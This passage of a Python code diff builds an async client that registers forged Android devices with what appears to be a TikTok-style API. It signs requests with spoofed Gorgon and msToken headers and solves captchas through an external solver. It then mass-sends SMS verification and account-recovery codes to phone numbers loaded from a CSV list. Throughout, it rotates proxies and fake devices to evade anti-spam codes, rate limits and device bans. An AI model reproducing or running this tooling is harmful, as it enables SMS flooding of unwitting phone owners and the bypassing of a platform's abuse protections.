+        if (self._session is None
+                or self._session.closed):
+            self._session = (
+                aiohttp.ClientSession(
+                    connector=self._connector,
+                    connector_owner=False,
+                    cookie_jar=(
+                        self._cookie_jar)))
+        return self._session
+
+    async def close(self) -> None:
+        if (self._session
+                and not self._session.closed):
+            await self._session.close()
+            self._session = None
+
+    def _generate_auth_headers(
+            self, params_str: str,
+            body: Any = None
+    ) -> Dict[str, str]:
+        """Generate authentication headers using
+        SignerPy for the current device context."""
+        ver = self.device.apk_version
+        cookie_str = ''
+        if self.device.ms_token_valid:
+            cookie_str = (
+                'msToken='
+                + self.device.ms_token)
+        auth = signer_headers(
+            params=params_str,
+            ver=ver,
+            device_id=self.device.device_id,
+            data=body,
+            cookie=cookie_str or None)
+        validate_gorgon_prefix(
+            auth, ver,
+            debug=self.config.debug_registration)
+        headers = {
+            'User-Agent':
+                self.device.user_agent,
+            'Accept-Encoding': 'gzip',
+            'Connection': 'Keep-Alive',
+        }
+        if self.device.ms_token_valid:
+            headers[MS_TOKEN_HEADER] = (
+                self.device.ms_token)
+        headers.update(auth)
+        return headers
+
+    async def _request(
+            self, method: str, url: str,
+            params_dict: Dict[str, str],
+            body: Any = None,
+            content_type: Optional[str] = None,
+            proxy_url: Optional[str] = None,
+            phone: str = '',
+            parse_json: bool = True
+    ) -> Optional[Any]:
+        masked = mask_phone(phone)
+        await self.limiter.acquire()
+        check_shutdown()
+        session = await self._get_session()
+        params_str = urlencode(params_dict)
+        headers = self._generate_auth_headers(
+            params_str, body)
+        if content_type:
+            headers['Content-Type'] = (
+                content_type)
+        elif body is not None:
+            if isinstance(body, str):
+                headers['Content-Type'] = (
+                    'application/'
+                    'x-www-form-urlencoded;'
+                    ' charset=UTF-8')
+            elif isinstance(body, bytes):
+                headers['Content-Type'] = (
+                    'application/octet-stream')
+        full_url = url + '?' + params_str
+        if (self.device
+                and self.device.ms_token_valid):
+            self.device.record_ms_token_use()
+        for attempt in range(
+                self.config.max_retries):
+            check_shutdown()
+            try:
+                kw: Dict[str, Any] = {
+                    'headers': headers,
+                    'timeout': (
+                        aiohttp.ClientTimeout(
+                            total=(
+                                self.config
+                                .request_timeout
+                            ))),
+                }
+                if proxy_url:
+                    kw['proxy'] = proxy_url
+                if (method == 'POST'
+                        and body is not None):
+                    kw['data'] = body
+                fn = (
+                    session.post
+                    if method == 'POST'
+                    else session.get)
+                async with fn(
+                        full_url, **kw) as resp:
+                    self._extract_ms_token(resp)
+                    if resp.status in (
+                            RETRYABLE_HTTP_CODES):
+                        wait = jitter_delay(
+                            attempt)
+                        log.warning(
+                            '[%s] HTTP %d,'
+                            ' retry %.1fs',
+                            masked, resp.status,
+                            wait)
+                        if resp.status == (
+                                HTTP_TOO_MANY_REQUESTS
+                        ):
+                            await (
+                                self.limiter
+                                .slow_down())
+                        await asyncio.sleep(wait)
+                        continue
+                    await (
+                        self.proxy
+                        .report_success(
+                            proxy_url))
+                    if parse_json:
+                        return (
+                            await resp.json(
+                                content_type=(
+                                    None)))
+                    else:
+                        return (
+                            await resp.read())
+            except (
+                asyncio.TimeoutError,
+                aiohttp.ServerTimeoutError
+            ):
+                await (
+                    self.proxy.report_failure(
+                        proxy_url))
+                await asyncio.sleep(
+                    jitter_delay(attempt, 0.5))
+            except (
+                aiohttp
+                .ClientProxyConnectionError
+            ):
+                await (
+                    self.proxy.report_failure(
+                        proxy_url))
+                new = await self.proxy.get(
+                    self.device.region
+                    if self.device else None)
+                if new and new != proxy_url:
+                    proxy_url = new
+                await asyncio.sleep(
+                    jitter_delay(attempt, 0.5))
+            except aiohttp.ClientError as exc:
+                await (
+                    self.proxy.report_failure(
+                        proxy_url))
+                raise NetworkError(
+                    type(exc).__name__ + ': '
+                    + str(exc))
+            except (ShutdownError, SignerError):
+                raise
+            except Exception as exc:
+                raise NetworkError(
+                    type(exc).__name__ + ': '
+                    + str(exc))
+        raise NetworkError(
+            'Max retries exhausted',
+            retryable=False)
+
+    def _extract_ms_token(
+            self,
+            resp: aiohttp.ClientResponse
+    ) -> None:
+        for cookie in resp.cookies.values():
+            if cookie.key == (
+                    MS_TOKEN_COOKIE_NAME):
+                self.device.set_ms_token(
+                    cookie.value)
+                return
+        hv = resp.headers.get(
+            MS_TOKEN_HEADER, '')
+        if hv:
+            self.device.set_ms_token(hv)
+
+    async def _ensure_ms_token(
+            self,
+            proxy_url: Optional[str] = None,
+            phone: str = '') -> bool:
+        if self.device.ms_token_valid:
+            return True
+        self.device.invalidate_ms_token()
+        for endpoint in (
+            'https://' + self.api_host
+            + '/passport/user/info/',
+            'https://' + self.api_host
+            + '/passport/app/'
+            + 'region_setting/',
+        ):
+            try:
+                await self._request(
+                    'GET', endpoint,
+                    self.device
+                    .base_params_with_signerpy_update(),
+                    proxy_url=proxy_url,
+                    phone=phone)
+            except (NetworkError, SignerError):
+                pass
+            if self.device.ms_token_valid:
+                return True
+        return False
+
+    async def _register_device(
+            self,
+            proxy_url: Optional[str] = None,
+            phone: str = '') -> bool:
+        masked = mask_phone(phone)
+        if self.device.use_count > 0:
+            issues = (
+                self.device.validate_pool_entry())
+            fatal = [
+                i for i in issues
+                if 'deprecated' not in i]
+            if fatal:
+                for issue in fatal:
+                    log.error(
+                        '[%s] Pool: %s',
+                        masked, issue)
+                raise DeviceError(
+                    str(len(fatal)) + ' issues')
+        payload = (
+            self.device
+            .registration_payload())
+        if self.config.debug_registration:
+            self._log_registration_payload(
+                masked, payload)
+        encrypted = signer_encrypt(payload)
+        if self.config.debug_registration:
+            log.info(
+                '[%s] Encrypted: %d bytes',
+                masked, len(encrypted))
+        try:
+            raw = await self._request(
+                'POST', URL_DEVICE_REGISTER,
+                self.device
+                .base_params_with_signerpy_update(),
+                encrypted,
+                content_type=(
+                    'application/'
+                    'octet-stream;'
+                    'tt-data=a'),
+                proxy_url=proxy_url,
+                phone=phone,
+                parse_json=False)
+        except (NetworkError, SignerError) as exc:
+            log.error(
+                '[%s] Register: %s',
+                masked, exc)
+            return False
+        if not raw:
+            return False
+        data = None
+        decode_method = 'unknown'
+        try:
+            data = json.loads(raw)
+            decode_method = 'plaintext'
+        except (json.JSONDecodeError,
+                ValueError):
+            try:
+                data = json.loads(
+                    signer_decrypt(raw))
+                decode_method = 'decrypted'
+            except SignerError as exc:
+                raise ParseError(
+                    'Register decrypt: '
+                    + str(exc))
+        if not isinstance(data, dict):
+            raise ParseError(
+                'Register: not dict')
+        if self.config.debug_registration:
+            self._log_registration_response(
+                masked, data, decode_method)
+        did = data.get('device_id', 0)
+        if did and did != 0:
+            self.device.device_id = str(did)
+            self.device.install_id = str(
+                data.get('install_id', 0))
+            self.device.registered = True
+            log.info(
+                '[%s] Registered: %s',
+                masked, self.device.device_id)
+            return True
+        self._log_registration_failure(
+            masked, data)
+        return False
+
+    @staticmethod
+    def _log_registration_payload(
+            masked: str,
+            payload: dict) -> None:
+        header = payload.get('header', {})
+        log.info(
+            '[%s] Payload:'
+            ' aid=%s ver=%s manifest=%s'
+            ' sig=%s device=%s os_api=%s',
+            masked,
+            header.get('aid'),
+            header.get('app_version'),
+            header.get('manifest_version_code'),
+            header.get('sig_hash'),
+            header.get('device_model'),
+            header.get('os_api'))
+
+    @staticmethod
+    def _log_registration_response(
+            masked: str, data: dict,
+            decode_method: str) -> None:
+        log.info(
+            '[%s] Response (%s):'
+            ' device_id=%s install_id=%s',
+            masked, decode_method,
+            data.get('device_id', '?'),
+            data.get('install_id', '?'))
+
+    @staticmethod
+    def _log_registration_failure(
+            masked: str,
+            data: dict) -> None:
+        ec = data.get(
+            'error_code',
+            data.get('status_code', '?'))
+        msg = data.get(
+            'message',
+            data.get('error', '?'))
+        log.error(
+            '[%s] device_id=0: ec=%s, msg=%s',
+            masked, ec, str(msg)[:200])
+        msg_lower = str(msg).lower()
+        ec_str = str(ec)
+        if 'signature' in msg_lower:
+            log.error(
+                '[%s] HINT: sig_hash outdated',
+                masked)
+        if 'update' in msg_lower:
+            log.error(
+                '[%s] HINT: APK too old',
+                masked)
+        if ('1105' in ec_str
+                or '1109' in ec_str):
+            log.error(
+                '[%s] HINT: signer mismatch',
+                masked)
+
+    async def _fetch_image_b64(
+            self, url: str,
+            phone: str = '') -> str:
+        if not url:
+            return ''
+        session = await self._get_session()
+        try:
+            async with session.get(
+                url,
+                timeout=aiohttp.ClientTimeout(
+                    total=10)
+            ) as resp:
+                if resp.status == 200:
+                    return base64.b64encode(
+                        await resp.read()
+                    ).decode()
+        except Exception:
+            pass
+        return ''
+
+    async def _extract_captcha_kwargs(
+            self, subtype: str,
+            question: dict,
+            phone: str = ''
+    ) -> Dict[str, str]:
+        if not question:
+            return {}
+        kwargs: Dict[str, str] = {}
+        url1 = (
+            question.get('url1', '')
+            or question.get('url', ''))
+        url2 = question.get('url2', '')
+        if subtype in ('3d', 'shapes'):
+            if url1:
+                img = (
+                    await self._fetch_image_b64(
+                        url1, phone))
+                if img:
+                    kwargs['image_b64'] = img
+        elif subtype in ('slide', 'puzzle'):
+            if url1 and url2:
+                p, pc = await asyncio.gather(
+                    self._fetch_image_b64(
+                        url1, phone),
+                    self._fetch_image_b64(
+                        url2, phone))
+                if p and pc:
+                    kwargs['puzzle_b64'] = p
+                    kwargs['piece_b64'] = pc
+        elif subtype == 'rotate':
+            if url1 and url2:
+                o, i = await asyncio.gather(
+                    self._fetch_image_b64(
+                        url1, phone),
+                    self._fetch_image_b64(
+                        url2, phone))
+                if o and i:
+                    kwargs['outer_b64'] = o
+                    kwargs['inner_b64'] = i
+        elif subtype == 'icon':
+            if url1:
+                img = (
+                    await self._fetch_image_b64(
+                        url1, phone))
+                if img:
+                    kwargs['image_b64'] = img
+                    kwargs['challenge'] = (
+                        question.get(
+                            'tip_text', ''))
+        return kwargs
+
+    async def _solve_captcha_flow(
+            self, subtype: str,
+            detail: str,
+            region: str,
+            verify_event: str,
+            scene: str = 'device_activate',
+            proxy_url: Optional[str] = None,
+            phone: str = '') -> bool:
+        masked = mask_phone(phone)
+        challenge = await self._request(
+            'GET', URL_CAPTCHA_GET, {
+                'aid': APP_AID,
+                'host': self.api_host,
+                'scene': scene,
+                'device_id': (
+                    self.device.device_id),
+                'install_id': (
+                    self.device.install_id),
+                'region': (
+                    region or 'useast2b'),
+                'subtype': subtype,
+                'detail': detail,
+                'lang': 'en',
+                'os': 'android',
+            },
+            proxy_url=proxy_url,
+            phone=phone)
+        if (not challenge
+                or not isinstance(
+                    challenge, dict)):
+            raise CaptchaError(
+                'Challenge failed')
+        cd = challenge.get('data', challenge)
+        if not isinstance(cd, dict):
+            raise CaptchaError(
+                'Challenge data invalid')
+        question = cd.get('question')
+        if (not question
+                or not isinstance(
+                    question, dict)):
+            log.info(
+                '[%s] No captcha', masked)
+            return True
+        rs = (
+            cd.get('subtype', subtype)
+            or subtype)
+        kwargs = (
+            await
+            self._extract_captcha_kwargs(
+                rs, question, phone))
+        if not kwargs:
+            raise CaptchaError(
+                'No captcha images')
+        session = await self._get_session()
+        solution = await self.captcha.solve(
+            rs, session,
+            phone=phone, **kwargs)
+        if not solution:
+            raise CaptchaError(
+                'Solver returned empty')
+        vr = await self._request(
+            'POST', URL_CAPTCHA_VERIFY,
+            {'aid': APP_AID,
+             'host': self.api_host},
+            json.dumps({
+                'solution': solution,
+                'detail': detail,
+                'verify_event':
+                    verify_event}),
+            content_type='application/json',
+            proxy_url=proxy_url,
+            phone=phone)
+        if (not vr
+                or not isinstance(vr, dict)):
+            raise CaptchaError(
+                'Verify empty')
+        if (vr.get('code') == 200
+                or 'success' in (
+                    str(vr).lower())):
+            return True
+        raise CaptchaError(
+            'Verify failed: '
+            + str(vr.get('code')))
+
+    async def _activate_device(
+            self,
+            proxy_url: Optional[str] = None,
+            phone: str = '') -> bool:
+        try:
+            return (
+                await self._solve_captcha_flow(
+                    '3d', '',
+                    self.device.region, '',
+                    'device_activate',
+                    proxy_url, phone))
+        except CaptchaError as exc:
+            log.warning(
+                '[%s] Activate: %s',
+                mask_phone(phone), exc)
+            return False
+
+    async def _handle_sms_captcha(
+            self, response_data: dict,
+            proxy_url: Optional[str] = None,
+            phone: str = '') -> bool:
+        if not isinstance(
+                response_data, dict):
+            return False
+        raw_conf = safe_get(
+            response_data, 'data',
+            'verify_center_decision_conf',
+            default='')
+        if not raw_conf:
+            raise CaptchaError(
+                'No captcha config')
+        try:
+            conf = (
+                json.loads(raw_conf)
+                if isinstance(raw_conf, str)
+                else raw_conf)
+        except (json.JSONDecodeError,
+                TypeError) as exc:
+            raise ParseError(
+                'Captcha conf: ' + str(exc))
+        if not isinstance(conf, dict):
+            raise ParseError(
+                'Captcha conf not dict')
+        return await self._solve_captcha_flow(
+            conf.get('subtype', '3d'),
+            conf.get('detail', ''),
+            conf.get('region', ''),
+            conf.get('verify_event', ''),
+            'passport_mobile_send_code',
+            proxy_url, phone)
+
+    async def _get_or_create_device(
+            self, country: str,
+            proxy_url: Optional[str] = None,
+            phone: str = '') -> bool:
+        masked = mask_phone(phone)
+        pooled = await self.pool.get(country)
+        if pooled:
+            self.device = pooled
+            self.device.session_uses = 0
+            self.api_host = (
+                self.config.random_host())
+            self._cookie_jar.clear()
+            log.info(
+                '[%s] Pooled %s (ver=%s)',
+                masked,
+                self.device.device_id,
+                self.device.version_name)
+            await self._ensure_ms_token(
+                proxy_url, phone)
+            return True
+        log.info(
+            '[%s] Registering for %s...',
+            masked, country)
+        self.device = Device.generate(
+            self.config, country)
+        self.api_host = (
+            self.config.random_host())
+        self._cookie_jar.clear()
+        try:
+            if not await (
+                    self._register_device(
+                        proxy_url, phone)):
+                raise DeviceError(
+                    'Registration failed')
+        except ParseError as exc:
+            raise DeviceError(str(exc))
+        await self._activate_device(
+            proxy_url, phone)
+        await self._ensure_ms_token(
+            proxy_url, phone)
+        await self.pool.add(self.device)
+        return True
+
+    async def _rotate_device(
+            self, country: str,
+            proxy_url: Optional[str] = None,
+            phone: str = '') -> bool:
+        if self.device:
+            await self.pool.remove(
+                self.device)
+        return (
+            await self._get_or_create_device(
+                country, proxy_url, phone))
+
+    async def _get_lightweight_device(
+            self, country: str,
+            proxy_url: Optional[str] = None,
+            phone: str = '') -> bool:
+        masked = mask_phone(phone)
+        self.device = (
+            Device.generate_lightweight(
+                self.config, country))
+        self.device.session_uses = 0
+        self.api_host = (
+            self.config.random_host())
+        self._cookie_jar.clear()
+        log.info(
+            '[%s] Lightweight %s for %s'
+            ' (ver=%s)',
+            masked,
+            self.device.device_id,
+            country,
+            self.device.version_name)
+        got_token = (
+            await self._ensure_ms_token(
+                proxy_url, phone))
+        if got_token:
+            log.info(
+                '[%s] msToken OK', masked)
+        else:
+            log.warning(
+                '[%s] msToken failed,'
+                ' proceeding', masked)
+        return True
+
+    async def _rotate_lightweight_device(
+            self, country: str,
+            proxy_url: Optional[str] = None,
+            phone: str = '') -> bool:
+        return (
+            await self._get_lightweight_device(
+                country, proxy_url, phone))
+
+    async def _setup_for_send(
+            self, phone: str
+    ) -> Tuple[str, str, str, Optional[str]]:
+        masked = mask_phone(phone)
+        session = await self._get_session()
+        info = await self.hlr.lookup(
+            session, phone)
+        if not info:
+            raise HLRError(
+                'No data for ' + masked)
+        log.info(
+            '[%s] %s +%s (%s)',
+            masked,
+            info.country_name,
+            info.country_prefix,
+            info.carrier)
+        proxy_url = await self.proxy.get(
+            info.country_code)
+        return (
+            info.country_code,
+            info.country_prefix,
+            info.national_number,
+            proxy_url)
+
+    def _should_try_next_endpoint(
+            self, ec: int) -> bool:
+        """Decide if we should fallback to the
+        next endpoint tier based on error code."""
+        return ec in TT_ANTI_SPAM_CODES
+
+    async def _send_on_endpoint(
+            self, phone: str,
+            endpoint: SMSEndpoint,
+            sms_type: int,
+            country: str, prefix: str,
+            national: str,
+            proxy_url: Optional[str],
+            extra_body_params: Dict[str, Any],
+            is_lightweight: bool,
+            max_session_uses: int,
+            event_tag: str,
+    ) -> Tuple[Optional[Dict[str, Any]], bool]:
+        """Try sending SMS on one endpoint.
+
+        Returns:
+            (result_dict, should_fallback)
+            result_dict is non-None on definitive
+            outcome (success or terminal error).
+            should_fallback=True means caller
+            should try next endpoint tier.
+        """
+        masked = mask_phone(phone)
+        captcha_attempts = 0
+        captcha_rotations_without_key = 0
+
+        for attempt in range(
+                self.config.max_retries):
+            check_shutdown()
+
+            if self.device.needs_rotation(
+                    max_session_uses):
+                if is_lightweight:
+                    await (
+                        self
+                        ._rotate_lightweight_device(
+                            country, proxy_url,
+                            phone))
+                else:
+                    await self._rotate_device(
+                        country, proxy_url,
+                        phone)
+
+            if not self.device.ms_token_valid:
+                await self._ensure_ms_token(
+                    proxy_url, phone)
+            self.device.record_session_use()
+
+            log.info(
+                '[%s] [%s] tier-%d %s'
+                ' type=%d attempt %d/%d'
+                ' (ver=%s, gorgon=%d)',
+                masked, event_tag,
+                endpoint.tier,
+                endpoint.path,
+                sms_type,
+                attempt + 1,
+                self.config.max_retries,
+                self.device.version_name,
+                self.device.apk_version
+                .gorgon_version)
+
+            body = build_body_for_endpoint(
+                endpoint, sms_type,
+                prefix, national,
+                extra_body_params)
+
+            try:
+                data = await self._request(
+                    'POST',
+                    'https://'
+                    + self.api_host
+                    + endpoint.path,
+                    self.device
+                    .base_params_with_signerpy_update(),
+                    body,
+                    proxy_url=proxy_url,
+                    phone=phone)
+            except NetworkError as exc:
+                if exc.retryable:
+                    await asyncio.sleep(
+                        random.uniform(
+                            self.config
+                            .delay_min,
+                            self.config
+                            .delay_max))
+                    continue
+                raise
+
+            if (not data
+                    or not isinstance(
+                        data, dict)):
+                await asyncio.sleep(
+                    random.uniform(
+                        self.config.delay_min,
+                        self.config.delay_max))
+                continue
+
+            ec = safe_get(
+                data, 'data', 'error_code',
+                default=None)
+            if ec is None:
+                ec = safe_get(
+                    data, 'error_code',
+                    default=-1)
+            try:
+                ec = int(ec)
+            except (ValueError, TypeError):
+                ec = -1
+
+            msg = str(
+                data.get('message', '')
+            ).lower()
+
+            # ── Success ──
+            if ec == 0:
+                log.info(
+                    '[%s] OK SMS sent (%s)'
+                    ' via tier-%d',
+                    masked, event_tag,
+                    endpoint.tier)
+                return {
+                    'status': 'success',
+                    'error_code': 0,
+                    'timestamp': int(
+                        time.time()),
+                    'endpoint_tier':
+                        endpoint.tier,
+                }, False
+
+            # ── Captcha ──
+            if ec == TT_CAPTCHA_REQUIRED:
+                captcha_attempts += 1
+                if (captcha_attempts
+                        > MAX_CAPTCHA_ATTEMPTS):
+                    raise CaptchaError(
+                        'Captcha loop')
+                if not self.captcha.has_key:
+                    captcha_rotations_without_key += 1
+                    if (captcha_rotations_without_key
+                            > MAX_CAPTCHA_ROTATIONS_NO_KEY):
+                        log.error(
+                            '[%s] Captcha %dx'
+                            ' no key. Giving up.',
+                            masked,
+                            captcha_rotations_without_key)
+                        raise CaptchaError(
+                            'No captcha key,'
+                            ' rotated '
+                            + str(
+                                captcha_rotations_without_key)
+                            + 'x')
+                    log.warning(
+                        '[%s] Captcha, no key,'
+                        ' rotating (%d/%d)',
+                        masked,
+                        captcha_rotations_without_key,
+                        MAX_CAPTCHA_ROTATIONS_NO_KEY)
+                    if is_lightweight:
+                        await (
+                            self
+                            ._rotate_lightweight_device(
+                                country,
+                                proxy_url,
+                                phone))
+                    else:
+                        await (
+                            self._rotate_device(
+                                country,
+                                proxy_url,
+                                phone))
+                    continue
+                try:
+                    if await (
+                        self
+                        ._handle_sms_captcha(
+                            data,
+                            proxy_url,
+                            phone)):
+                        continue
+                except (
+                    CaptchaError, ParseError
+                ):
+                    pass
+                if is_lightweight:
+                    await (
+                        self
+                        ._rotate_lightweight_device(
+                            country,
+                            proxy_url,
+                            phone))
+                else:
+                    await self._rotate_device(
+                        country, proxy_url,
+                        phone)
+                continue
+
+            # ── Anti-spam / rate limit ──
+            if ec in TT_RATE_LIMIT_CODES:
+                await self.limiter.slow_down()
+                if self._should_try_next_endpoint(
+                        ec):
+                    log.warning(
+                        '[%s] ec=%d on tier-%d,'
+                        ' trying next endpoint',
+                        masked, ec,
+                        endpoint.tier)
+                    return None, True
+                await asyncio.sleep(
+                    jitter_delay(
+                        attempt, 2.0, 15.0))
+                continue
+
+            # ── Device ban ──
+            if ec == TT_DEVICE_BAN:
+                log.warning(
+                    '[%s] Device ban on tier-%d,'
+                    ' trying next endpoint',
+                    masked, endpoint.tier)
+                if is_lightweight:
+                    await (
+                        self
+                        ._rotate_lightweight_device(
+                            country,
+                            proxy_url,
+                            phone))
+                else:
+                    await self._rotate_device(
+                        country, proxy_url,
+                        phone)
+                return None, True
+
+            # ── msToken errors ──
+            if ec in TT_MSTOKEN_ERRORS:
+                self.device.invalidate_ms_token()
+                if await (
+                        self._ensure_ms_token(
+                            proxy_url, phone)):
+                    continue
+                raise TokenError(
+                    'ms_token error '
+                    + str(ec))
+
+            # ── Ambiguous success ──
+            if ec == -1 and 'success' in msg:
+                log.info(
+                    '[%s] OK SMS sent (%s)'
+                    ' via tier-%d',
+                    masked, event_tag,
+                    endpoint.tier)
+                return {
+                    'status': 'success',
+                    'error_code': 0,
+                    'timestamp': int(
+                        time.time()),
+                    'endpoint_tier':
+                        endpoint.tier,
+                }, False
+
+            # ── Terminal error ──
+            raw_msg = data.get('message', '')
+            log.error(
+                '[%s] FAIL ec=%d on tier-%d,'
+                ' msg=%s',
+                masked, ec,
+                endpoint.tier,
+                str(raw_msg)[:100])
+            return {
+                'status': 'fail',
+                'error_code': ec,
+                'timestamp': int(
+                    time.time()),
+                'endpoint_tier':
+                    endpoint.tier,
+            }, False
+
+        # All retries exhausted on this endpoint
+        log.warning(
+            '[%s] Retries exhausted'
+            ' on tier-%d, fallback',
+            masked, endpoint.tier)
+        return None, True
+
+    async def _send_with_fallback(
+            self, phone: str,
+            event_cfg: EventEndpointConfig,
+            country: str, prefix: str,
+            national: str,
+            proxy_url: Optional[str],
+            result: Dict[str, Any],
+            extra_body_params: Dict[str, Any],
+            is_lightweight: bool,
+            max_session_uses: int,
+            event_tag: str,
+    ) -> Dict[str, Any]:
+        """Try sending SMS across endpoint chain
+        with automatic fallback."""
+        masked = mask_phone(phone)
+        chain = build_endpoint_chain(
+            event_cfg,
+            include_deprecated=(
+                self.config
+                .include_deprecated_endpoints))
+
+        if not chain:
+            raise EndpointExhaustedError(
+                'No endpoints available')
+
+        log.info(
+            '[%s] Endpoint chain: %s',
+            masked,
+            ' → '.join(
+                'tier-' + str(ep.tier)
+                + '(' + str(st) + ')'
+                for ep, st in chain))
+
+        for idx, (endpoint, sms_type) in (
+                enumerate(chain)):
+            check_shutdown()
+
+            if idx > 0:
+                self.api_host = (
+                    self.config.random_host())
+                delay = (
+                    self.config
+                    .endpoint_fallback_delay)
+                log.info(
+                    '[%s] Fallback to tier-%d'
+                    ' (host=%s, delay=%.1fs)',
+                    masked, endpoint.tier,
+                    self.api_host, delay)
+                await asyncio.sleep(delay)
+
+                if is_lightweight:
+                    await (
+                        self
+                        ._rotate_lightweight_device(
+                            country,
+                            proxy_url,
+                            phone))
+                else:
+                    if self.device.needs_rotation(
+                            max_session_uses):
+                        await (
+                            self._rotate_device(
+                                country,
+                                proxy_url,
+                                phone))
+
+            try:
+                ep_result, should_fallback = (
+                    await self._send_on_endpoint(
+                        phone, endpoint,
+                        sms_type,
+                        country, prefix,
+                        national, proxy_url,
+                        extra_body_params,
+                        is_lightweight,
+                        max_session_uses,
+                        event_tag))
+            except (
+                CaptchaError, TokenError,
+                NetworkError, SignerError,
+            ) as exc:
+                log.warning(
+                    '[%s] tier-%d error: %s,'
+                    ' trying next',
+                    masked, endpoint.tier, exc)
+                continue
+
+            if ep_result is not None:
+                result.update(ep_result)
+                return result
+
+            if not should_fallback:
+                break
+
+        if result['status'] != 'success':
+            if result['error_code'] == 0:
+                result['error_code'] = (
+                    ERR_ALL_ENDPOINTS_FAILED)
+            log.error(
+                '[%s] All %d endpoints failed',
+                masked, len(chain))
+
+        return result
+
+    async def send_event(
+            self, phone: str,
+            event: str = 'recovery'
+    ) -> Dict[str, Any]:
+        is_lightweight = (
+            event in LIGHTWEIGHT_EVENTS)
+        event_cfg = get_event_config(event)
+
+        result: Dict[str, Any] = {
+            'phone': phone,
+            'status': 'fail',
+            'error_code': 0,
+            'timestamp': int(time.time()),
+            'event': event,
+        }
+
+        try:
+            check_shutdown()
+            (country, prefix,
+             national, proxy_url) = (
+                await self._setup_for_send(
+                    phone))
+
+            if is_lightweight:
+                if not await (
+                        self
+                        ._get_lightweight_device(
+                            country,
+                            proxy_url,
+                            phone)):
+                    raise DeviceError(
+                        'Lightweight setup failed')
+                max_uses = (
+                    self.config
+                    .recovery_max_uses)
+            else:
+                if not await (
+                        self
+                        ._get_or_create_device(
+                            country,
+                            proxy_url, phone)):
+                    raise DeviceError(
+                        'Device setup failed')
+                max_uses = (
+                    self.config
+                    .device_max_uses)
+
+            extra_params = (
+                EVENT_EXTRA_PARAMS.get(
+                    event, {
+                        'account_sdk_source':
+                            'app',
+                        'mix_mode': 1,
+                        'multi_login': 1,
+                    }))
+
+            return (
+                await self._send_with_fallback(
+                    phone, event_cfg,
+                    country, prefix,
+                    national, proxy_url,
+                    result, extra_params,
+                    is_lightweight,
+                    max_uses, event))
+
+        except ShutdownError:
+            result['error_code'] = ERR_SHUTDOWN
+        except HLRError as exc:
+            log.error(
+                '[%s] HLR: %s',
+                mask_phone(phone), exc)
+            result['error_code'] = (
+                ERR_HLR_FAILED)
+        except DeviceError as exc:
+            log.error(
+                '[%s] Device: %s',
+                mask_phone(phone), exc)
+            result['error_code'] = (
+                ERR_DEVICE_SETUP)
+        except CaptchaError as exc:
+            log.error(
+                '[%s] Captcha: %s',
+                mask_phone(phone), exc)
+            result['error_code'] = (
+                ERR_CAPTCHA_LOOP)
+        except TokenError as exc:
+            log.error(
+                '[%s] Token: %s',
+                mask_phone(phone), exc)
+            result['error_code'] = ERR_MSTOKEN
+        except SignerError as exc:
+            log.error(
+                '[%s] Signer: %s',
+                mask_phone(phone), exc)
+            result['error_code'] = ERR_SIGNER
+        except EndpointExhaustedError as exc:
+            log.error(
+                '[%s] Endpoints: %s',
+                mask_phone(phone), exc)
+            result['error_code'] = (
+                ERR_ALL_ENDPOINTS_FAILED)
+        except NetworkError as exc:
+            log.error(
+                '[%s] Network: %s',
+                mask_phone(phone), exc)
+            result['error_code'] = (
+                ERR_MAX_RETRIES)
+        except Exception as exc:
+            log.error(
+                '[%s] %s: %s',
+                mask_phone(phone),
+                type(exc).__name__, exc)
+            result['error_code'] = ERR_CRASH
+        finally:
+            if (self.device
+                    and self.device.registered):
+                await self.pool.update(
+                    self.device)
+
+        return result
+
+    # Legacy compatibility wrapper
+    async def send_sms(
+            self, phone: str,
+            sms_type: int = 5,
+            event_tag: str = 'register'
+    ) -> Dict[str, Any]:
+        return await self.send_event(
+            phone, event_tag)
+
+
+# ============================================
+#  RESULT WRITER
+# ============================================
+
+def read_numbers(path: str) -> List[str]:
+    numbers = []
+    with open(path, 'r') as f:
+        for row in csv.reader(f):
+            if row:
+                num = row[0].strip()
+                if (num
+                        and not num.startswith(
+                            '#')):
+                    numbers.append(num)
+    log.info(
+        'Loaded %d from %s',
+        len(numbers), path)
+    return numbers
+
+
+class ResultWriter:
+
+    def __init__(
+            self, success_path: str,
+            fail_path: str):
+        self._lock = asyncio.Lock()
+        self._sp = success_path
+        self._fp = fail_path
+        self._sf = None
+        self._ff = None
+        self._sw = None
+        self._fw = None
+        self.success = 0
+        self.fail = 0
+        self._writes_since_fsync = 0
+
+    def _open_sync(self) -> None:
+        self._sf = open(
+            self._sp, 'w', newline='')
+        self._ff = open(
+            self._fp, 'w', newline='')
+        self._sw = csv.writer(self._sf)
+        self._fw = csv.writer(self._ff)
+        self._sw.writerow(
+            ['phone', 'event', 'tier',
+             'timestamp'])
+        self._fw.writerow(
+            ['phone', 'event', 'error_code',
+             'tier', 'timestamp'])
+        self._sf.flush()
+        self._ff.flush()
+        os.fsync(self._sf.fileno())
+        os.fsync(self._ff.fileno())
+
+    async def open(self) -> None:
+        await run_in_io(self._open_sync)
+
+    def _write_sync(
+            self, is_success: bool,
+            row: list) -> None:
+        if is_success:
+            self._sw.writerow(row)
+            self._sf.flush()
+        else:
+            self._fw.writerow(row)
+            self._ff.flush()
+        self._writes_since_fsync += 1
+        if (self._writes_since_fsync
+                >= FSYNC_INTERVAL):
+            os.fsync(self._sf.fileno())
+            os.fsync(self._ff.fileno())
+            self._writes_since_fsync = 0
+
+    async def write(
+            self,
+            result: Dict[str, Any]) -> None:
+        async with self._lock:
+            ok = (
+                result['status'] == 'success')
+            event = result.get(
+                'event', 'unknown')
+            tier = result.get(
+                'endpoint_tier', '?')
+            if ok:
+                row = [
+                    result['phone'],
+                    event,
+                    tier,
+                    result['timestamp']]
+                self.success += 1
+            else:
+                row = [
+                    result['phone'],
+                    event,
+                    result['error_code'],
+                    tier,
+                    result['timestamp']]
+                self.fail += 1
+            await run_in_io(
+                self._write_sync, ok, row)
+            total = self.success + self.fail
+            if total % 25 == 0:
+                log.info(
+                    'Progress: %d,'
+                    ' %d ok, %d fail',
+                    total, self.success,
+                    self.fail)
+
+    def _close_sync(self) -> None:
+        for f in (self._sf, self._ff):
+            if f:
+                try:
+                    f.flush()
+                    os.fsync(f.fileno())
+                    f.close()
+                except Exception:
+                    pass
+
+    async def close(self) -> None:
+        await run_in_io(self._close_sync)
+
+    def summary(self) -> None:
+        total = self.success + self.fail
+        rate = (
+            (self.success / total * 100)
+            if total > 0 else 0)
+        log.info(
+            'DONE: %d total, %d ok (%.1f%%),'
+            ' %d fail',
+            total, self.success, rate,
+            self.fail)
+
+
+# ============================================
+#  RESOURCE GUARD
+# ============================================
+
+class ResourceGuard:
+
+    def __init__(self):
+        self._pool: Optional[
